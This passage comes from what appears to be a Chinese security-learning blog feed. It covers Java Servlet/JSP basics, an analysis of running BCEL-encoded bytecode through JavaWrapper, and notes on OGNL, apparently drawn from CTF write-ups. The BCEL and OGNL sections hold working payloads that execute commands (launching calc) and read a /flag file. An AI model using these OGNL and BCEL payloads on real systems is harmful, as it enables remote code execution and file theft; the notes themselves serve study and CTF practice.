class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;        <span class="hljs-type">PrintWriter</span> writer = resp.getWriter();        writer.print(<span class="hljs-string">&quot;hello servlet&quot;</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> void doPost(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;    &#125;&#125;</code></pre></div><p>写完后要有关键一步，注册servlet</p><p>在web.xml中注册并设置路由</p><div class="code-wrapper"><pre><code class="hljs xml">//两个servlet-name名字相同即可<span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.zero.servlet.HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/index<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>   //路由<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></code></pre></div><p>然后要配置tomcat，跟上面一样（记得war包）</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916221136554.png" alt="image-20230916221136554"></p><p>我们在web.xml中设置的路由是建立在Application context的路由基础上的</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916221255984.png" alt="image-20230916221255984"></p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916215650016.png" alt="image-20230916215650016"></p><h2 id="servlet原理"><a href="#servlet原理" class="headerlink" title="servlet原理"></a>servlet原理</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse resp)</span> <span class="hljs-comment">//req请求，resp响应</span></code></pre></div><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916223636244.png" alt="image-20230916223636244"></p><h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><p>路由能使用<strong>通配符</strong>，但通配符的优先级更低，所以访问<code>/index</code>仍然是<code>HelloServlet</code>的内容</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.zero.servlet.HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/index<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>error<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.zero.servlet.ErrorServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>error<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></code></pre></div><h2 id="ServletContext对象"><a href="#ServletContext对象" class="headerlink" title="ServletContext对象"></a>ServletContext对象</h2><h3 id="共享数据"><a href="#共享数据" class="headerlink" title="共享数据"></a>共享数据</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//</span><span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getServletContext();        servletContext.setAttribute(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;zeropeach&quot;</span>);        resp.getWriter().println(<span class="hljs-string">&quot;i am in 1231231&quot;</span>);   &#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//    </span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getServletContext();        <span class="hljs-type">Object</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> servletContext.getAttribute(<span class="hljs-string">&quot;user&quot;</span>);        resp.getWriter().println(<span class="hljs-string">&quot;you are &quot;</span>+user);    &#125;</code></pre></div><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916225723367.png" alt="image-20230916225723367"></p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916225745267.png" alt="image-20230916225745267"></p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916225752556.png" alt="image-20230916225752556"></p><h3 id="能获取web-xml设置的初始值"><a href="#能获取web-xml设置的初始值" class="headerlink" title="能获取web.xml设置的初始值"></a>能获取web.xml设置的初始值</h3><div class="code-wrapper"><pre><code class="hljs sqf">&lt;context-<span class="hljs-built_in">param</span>&gt;    &lt;<span class="hljs-built_in">param</span>-<span class="hljs-built_in">name</span>&gt;cmd&lt;/<span class="hljs-built_in">param</span>-<span class="hljs-built_in">name</span>&gt;    &lt;<span class="hljs-built_in">param</span>-value&gt;heiheiehi&lt;/<span class="hljs-built_in">param</span>-value&gt;&lt;/context-<span class="hljs-built_in">param</span>&gt;</code></pre></div><div class="code-wrapper"><pre><code class="hljs abnf">ServletContext servletContext <span class="hljs-operator">=</span> this.getServletContext()<span class="hljs-comment">;</span>String cmd <span class="hljs-operator">=</span> servletContext.getInitParameter(<span class="hljs-string">&quot;cmd&quot;</span>)<span class="hljs-comment">;</span>resp.getWriter().println(cmd)<span class="hljs-comment">;</span></code></pre></div><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916230454868.png" alt="image-20230916230454868"></p><h3 id="实现跳转"><a href="#实现跳转" class="headerlink" title="实现跳转"></a>实现跳转</h3><div class="code-wrapper"><pre><code class="hljs erb"><span class="language-xml">//index.jsp</span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>跳转<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml">&lt;%</span><span class="language-ruby"><span class="hljs-variable">@page</span> pageEncoding=<span class="hljs-string">&quot;utf-8&quot;</span> </span><span class="language-xml">%&gt;</span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;$&#123;pageContext.request.contextPath&#125;/index&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span></span><span class="language-xml">    用户<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><span class="language-xml">    密码<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">@Overrideprotected void <span class="hljs-keyword">do</span><span class="hljs-constructor">Post(HttpServletRequest <span class="hljs-params">req</span>, HttpServletResponse <span class="hljs-params">resp</span>)</span> throws ServletException, IOException &#123;    String username = req.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;username&quot;</span>)</span>;    String password = req.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;password&quot;</span>)</span>;    <span class="hljs-keyword">if</span> (username.equals(<span class="hljs-string">&quot;admin&quot;</span>)&amp;&amp;password.equals(<span class="hljs-string">&quot;admin&quot;</span>))&#123;        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;成功&quot;</span>);        resp.send<span class="hljs-constructor">Redirect(<span class="hljs-string">&quot;/s1/success.jsp&quot;</span>)</span>;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.zero.servlet.HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/index<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span></code></pre></div><p>这里<code>post</code>请求对应<code>doPost</code>方法</p><h2 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h2><p>&lt;%&#x3D; 变量或表达式%&gt;     &lt;%&#x3D;new java.util.Date()%&gt;</p><div class="code-wrapper"><pre><code class="hljs axapta">&lt;%<span class="hljs-built_in">int</span> <span class="hljs-keyword">sum</span>=<span class="hljs-number">0</span>;<span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">100</span>;i++)&#123;    <span class="hljs-keyword">sum</span>+=i;&#125;    out.println(<span class="hljs-string">&quot;&lt;h1&gt;sum=&quot;</span>+<span class="hljs-keyword">sum</span>+<span class="hljs-string">&quot;&lt;/h1&gt;&quot;</span>);%&gt;</code></pre></div><div class="code-wrapper"><pre><code class="hljs erlang-repl">&lt;<span class="hljs-comment">%</span>    int i =<span class="hljs-number">10</span>;<span class="hljs-comment">%&gt;</span>&lt;<span class="hljs-comment">%</span>    out.println(i);<span class="hljs-comment">%&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs gcode">&lt;<span class="hljs-meta">%</span>--在代码嵌入HTML--<span class="hljs-meta">%</span>&gt; &lt;<span class="hljs-meta">%</span>    for<span class="hljs-comment">(int i=0;i&lt;5;i++)</span>&#123; <span class="hljs-meta">%</span>&gt;    &lt;h<span class="hljs-number">1</span>&gt;hello world &lt;<span class="hljs-meta">%</span>=i<span class="hljs-meta">%</span>&gt;&lt;/h<span class="hljs-number">1</span>&gt; &lt;<span class="hljs-meta">%</span>    &#125; <span class="hljs-meta">%</span>&gt;</code></pre></div><p><code>&lt;%!%&gt;</code>声明方法和变量</p><p>&lt;% page errorPage&#x3D;”路径”%&gt;</p><div class="code-wrapper"><pre><code class="hljs routeros">&lt;%@<span class="hljs-built_in"> page </span><span class="hljs-attribute">contentType</span>=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> <span class="hljs-attribute">language</span>=<span class="hljs-string">&quot;java&quot;</span> %&gt;</code></pre></div><h2 id="FILTER"><a href="#FILTER" class="headerlink" title="FILTER"></a>FILTER</h2><h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><h1 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h1><p>什么是MVC架构？MVC是Model、View、Controller</p><p>Model : 数据以及信息，相当于数据库</p><p>View : 前端页面</p><p>Controller : 根据用户从视图层输入的指令，选取数据层中的数据，然后进行对应的操作</p><h2 id="EL表达式"><a href="#EL表达式" class="headerlink" title="EL表达式"></a>EL表达式</h2><p>语法：${…}</p><p>调用pageContext.findAttribute方法，用标识符为关键字，分别从page、request、session、application四个域中查找相应的对象，找到则返回相应的对象，找不到返回””（空字符串）</p><blockquote><p>pageContext中最重要的方法：findAttribute方法，<br>使用pageContext.findAttribute方法能从<br>四个域(page, request, session, context)中寻找存储的数据，</p><p>查找的顺序也是从小到大(page—&gt;request—&gt;session—&gt;context)，</p><p>只要在某个域中能查到相对应的键值对，就返回，</p><p>如果四个域都没有则返回null。<br>这个方式对于EL表达式是最重要的，<br>例如JSP页面中有一个EL表达式： ${data}<br>最终在Servlet中就会被翻译成 pageContext.findAttribute(“data”)。</p></blockquote><p>查找的顺序从小到大(page—&gt;request—&gt;session—&gt;context)</p><div class="code-wrapper"><pre><code class="hljs pf">pageContext.<span class="hljs-built_in">set</span>Attribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;asd&quot;</span>)request.<span class="hljs-built_in">set</span>Attribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;asd&quot;</span>)session.<span class="hljs-built_in">set</span>Attribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;asd&quot;</span>)application.<span class="hljs-built_in">set</span>Attribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;asd&quot;</span>)</code></pre></div><div class="code-wrapper"><pre><code class="hljs mel">&lt;%=pageContext.getAttribute(<span class="hljs-string">&quot;name&quot;</span>)%&gt;&lt;%=pageContext.getRequest().getAttribute(<span class="hljs-string">&quot;name&quot;</span>)%&gt;&lt;%=pageContext.getSession().getAttribute(<span class="hljs-string">&quot;name&quot;</span>)%&gt;&lt;%=pageContext.getServletContext.getAttribute(<span class="hljs-string">&quot;name&quot;</span>)%&gt;</code></pre></div><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>&lt;%@ page isELIgnored&#x3D;”false”%&gt;</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaWrapper执行BCEL字节码</title>
    <link href="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="通过JavaWrapper执行BCEL字节码"><a href="#通过JavaWrapper执行BCEL字节码" class="headerlink" title="通过JavaWrapper执行BCEL字节码"></a>通过JavaWrapper执行BCEL字节码</h1><p>前言</p><p>在SICTF Round2中看到unknown师傅使用了BCEL字节码，看了他的WP后发现一种我没见过的执行方式，在网上好像找不到（可能是我不会搜索），于是自己分析源码</p><p>追加一下，在WMCTF2023的官方WP中看到Boogipop大佬解题时用到</p><p>unknown师傅的代码</p><div class="code-wrapper"><pre><code class="hljs powershell">//        //第一种触发方式//        JavaClass <span class="hljs-built_in">cls</span> = Repository.lookupClass(Evil.class);//        String code = Utility.encode(cls.getBytes(), true);//        System.out.println(<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span>+code);////        new ClassLoader().loadClass(<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span> + code).newInstance();//        第二种触发方式        JavaClass javaClass = Repository.lookupClass(Evil.class);        String encode = Utility.encode(javaClass.getBytes(), true);        JavaWrapper._main(new String[]&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span>+encode&#125;);        System.out.println(<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span>+encode);</code></pre></div><h2 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h2><p>我们常使用的BCEL是使用ClassLoader</p><div class="code-wrapper"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.bcel</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.util</span>.ClassLoader</code></pre></div><p>我们搜索一下这个包</p><p><img src="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/image-20230916120726884.png" alt="image-20230916120726884"></p><p>查看一下JavaWrapper类</p><p><img src="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/image-20230916121036227.png" alt="image-20230916121036227"></p><p>可以看到这两个跟ClassLoader执行方式有关的地方</p><p>继续往下看</p><p><img src="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/image-20230916121504223.png" alt="image-20230916121504223"></p><p>两图中的红框几乎凑出了利用ClassLoader的方式</p><p>所以<code>JavaWrapper</code>执行的原理就是通过ClassLoader的方式来执行</p><p>正常情况下找到了漏洞点，应该像找CC链一样，find usages查看谁调用了<code>runMain</code>方法</p><p>这里巧合的是就在代码下面</p><p><img src="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/image-20230916122131607.png" alt="image-20230916122131607"></p><p>到了这里思路大致就清晰了（但若细问为什么我也说不上来）</p><p><code>getClassLoader</code>什么时候调用我也不清楚</p><p>但是我们不用管那么多，只知道调用<code>_main</code>方法就行</p><p>那个class_name就像执行ClassLoader时那样，传入<code>$$BCEL$$......</code>即可</p><h2 id="上手尝试"><a href="#上手尝试" class="headerlink" title="上手尝试"></a>上手尝试</h2><p>我们先尝试原来<code>ClassLoader</code>执行时要用的恶意类</p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;        <span class="hljs-keyword">static</span> &#123;            <span class="hljs-keyword">try</span> &#123;                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">RuntimeException</span>(e);            &#125;        &#125;&#125;</code></pre></div><p><img src="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/image-20230916123233706.png" alt="image-20230916123233706"></p><p>没有执行成功</p><p>按照提示加入<code>_main</code>方法</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_main</span><span class="hljs-params">(String[] argv)</span> &#123;        <span class="hljs-keyword">try</span> &#123;            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);        &#125;    &#125;&#125;</code></pre></div><p><img src="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/image-20230916123451935.png" alt="image-20230916123451935"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>JavaWrapper只是在ClassLoader基础上套了一点东西而已</p><p>更加方便了</p><div class="code-wrapper"><pre><code class="hljs powershell">JavaWrapper._main(new String[]&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span>+code&#125;);</code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>浅看OGNL</title>
    <link href="/2023/09/12/%E6%B5%85%E7%9C%8BOGNL/"/>
    <url>/2023/09/12/%E6%B5%85%E7%9C%8BOGNL/</url>
    
    <content type="html"><![CDATA[<h1 id="ONGL"><a href="#ONGL" class="headerlink" title="ONGL"></a>ONGL</h1><p>@获取静态对象、静态方法、静态变量</p><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@java</span>.lang.Runtime<span class="hljs-variable">@getRuntime</span>().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div><p>#非root用户获取对象</p><div class="code-wrapper"><pre><code class="hljs reasonml">context.put(<span class="hljs-string">&quot;student2&quot;</span>, student2);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Ognl</span>.</span></span>get<span class="hljs-constructor">Value(<span class="hljs-string">&quot;#student2.name&quot;</span>, <span class="hljs-params">context</span>, <span class="hljs-params">context</span>.<span class="hljs-params">getRoot</span>()</span>);</code></pre></div><p>new 一个类时，要写完整类名</p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">new</span> <span class="hljs-type">java</span>.lang.<span class="hljs-keyword">String</span>(<span class="hljs-string">&quot;testnew&quot;</span>)</code></pre></div><p><code>%&#123;&#125;</code>里的是OGNL表达式并计算表达式的值。</p><p><code>$</code>在配置文件中引用OGNL表达式。</p><p>创建MAP:<code>#&#123;key:value,key1:value1...&#125;</code></p><p>创建list    <code>&#123;value1,value2...&#125;</code>           ！！</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@java</span>.lang.Runtime<span class="hljs-variable">@getRuntime</span>().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;calc&quot;</span>)(new java.lang.<span class="hljs-built_in">ProcessBuilder</span>(new java.lang.String[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)).<span class="hljs-built_in">start</span>()</code></pre></div><p>注意什么时候用<code>@</code>，什么时候用<code>.</code>  (是否是静态方法)</p><div class="code-wrapper"><pre><code class="hljs stylus">#实例化时记得先把前面先包起来，再newInstance(#a=new com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.bcel</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.ClassLoader</span>()<span class="hljs-selector-class">.loadClass</span>(<span class="hljs-string">&#x27;$$BCEL$$....&#x27;</span>))<span class="hljs-selector-class">.newInstance</span>()</code></pre></div><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><div class="code-wrapper"><pre><code class="hljs clojure">(<span class="hljs-name">#a=new</span> java.util.Scanner(<span class="hljs-name"><span class="hljs-built_in">new</span></span> java.io.File(<span class="hljs-string">&quot;/flag&quot;</span>)).next())</code></pre></div><h2 id="大体框架"><a href="#大体框架" class="headerlink" title="大体框架"></a>大体框架</h2><div class="code-wrapper"><pre><code class="hljs reasonml">OgnlContext context = <span class="hljs-keyword">new</span> <span class="hljs-constructor">OgnlContext()</span>;<span class="hljs-comment">//        context.setRoot(test);</span>context.put(<span class="hljs-string">&quot;user&quot;</span>,user);<span class="hljs-comment">//        //表达式</span>String express = <span class="hljs-string">&quot;(#a=@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;))&quot;</span>;<span class="hljs-comment">//        String express = &quot;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;\&quot;calc\&quot;&#125;)).start()&quot;;</span>Object ognl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Ognl</span>.</span></span>parse<span class="hljs-constructor">Expression(<span class="hljs-params">express</span>)</span>;Object value = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Ognl</span>.</span></span>get<span class="hljs-constructor">Value(<span class="hljs-params">ognl</span>,<span class="hljs-params">context</span>,<span class="hljs-params">context</span>.<span class="hljs-params">getRoot</span>()</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(value);</code></pre></div><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>大多是一些ASTXXX (一些语法树)。。。</p><p>自己看文章吧</p><h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h1><p><a href="https://xz.aliyun.com/t/10482#toc-14">一文读懂OGNL漏洞 - 先知社区 (aliyun.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java基础和springboot</title>
    <link href="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/"/>
    <url>/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/</url>
    
    <content type="html"><![CDATA[<h1 id="java基础"><a href="#java基础" class="headerlink" title="java基础"></a>java基础</h1><p><a href="https://boogipop.com/2023/03/02/JavaSE_%E5%9F%BA%E7%A1%80/">直接看Boogipop大佬的文章，贼全面</a> ，我就记录一些不会的</p><h2 id="JVM-角度说进程与线程之间的关系"><a href="#JVM-角度说进程与线程之间的关系" class="headerlink" title="JVM 角度说进程与线程之间的关系"></a>JVM 角度说进程与线程之间的关系</h2><p>一个运行的exe就是一个进程，进程可以有多个线程</p><p>同一个进程中的多个线程共享堆和方法区</p><p>每个线程有独立的自己的程序计数器、虚拟机栈和本地方法栈</p><p>多线程并不能提高运行速度，只能提高CPU使用效率</p><h2 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h2><p>在线程中执行一个方法时，会创建一个栈帧入栈并执行，不管该栈帧是正常结束还是异常，栈帧都会销毁</p><h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>SICTF看到一个很秀的操作</p><div class="code-wrapper"><pre><code class="hljs reasonml">(#a=<span class="hljs-keyword">new</span> java.util.<span class="hljs-constructor">Scanner(<span class="hljs-params">new</span> <span class="hljs-params">java</span>.<span class="hljs-params">io</span>.File(<span class="hljs-string">&quot;/flag&quot;</span>)</span>).next<span class="hljs-literal">()</span>)<span class="hljs-comment">//“#a”是因为使用OGNL表达式</span></code></pre></div><p>读取内容</p><p>两种方式读取<code>next()，nextline()</code></p><p><code>next()</code>以<strong>空格</strong>为分隔符，<code>nextline()</code>以<strong>回车</strong>为分隔符</p><div class="code-wrapper"><pre><code class="hljs abnf">Scanner test <span class="hljs-operator">=</span> new Scanner(System.in)<span class="hljs-comment">;</span>if(test.hasNext())&#123;String a <span 